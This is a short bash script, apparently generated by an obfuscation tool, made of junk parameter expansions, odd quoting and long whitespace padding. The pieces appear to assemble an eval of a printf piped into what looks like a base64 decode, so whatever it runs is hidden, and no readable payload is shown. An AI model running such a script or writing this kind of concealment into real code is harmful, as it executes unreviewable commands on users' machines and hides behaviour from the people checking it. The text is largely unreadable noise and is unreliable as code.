#!/bin/bash
{@,}                                                                                                                                                                                                      ${!@}                                                                                                                                                                                                                                                                                                                             'e'\v"""a"l{*%%hAuWg}                                                                                                                                                                                                                                                                                     "${@%%-5$\]5}"                                p'r'$'\x69'""\n$'\u0074'\f                                                                                                                                                                                                                                                                                                                                                                                                                                        "{@//ip^s\{n*/YD#9N<}{*##1\{t*K}                                                                                                                                                                                                                                                                                                                |{*%edC4Ud}                                                                                                                      ${*,}                                                                                                                                                                                                                                                                                                                                                                       ""'b'a${*//x-&i\]/i+lrzG}s"${@^}"e$((                                                                                                                                                                                                                   ((54#0*"5""${@//EUM@1/a4_s}"1#2)+"2"#${@/n2%\)Z}{*,,}0--3${*#GhNdT,@|}#11)+"3"${*,,}d                                                                                                                                                                                              ${*//Y5Yl*\)mQ}   ${*^^}{*~}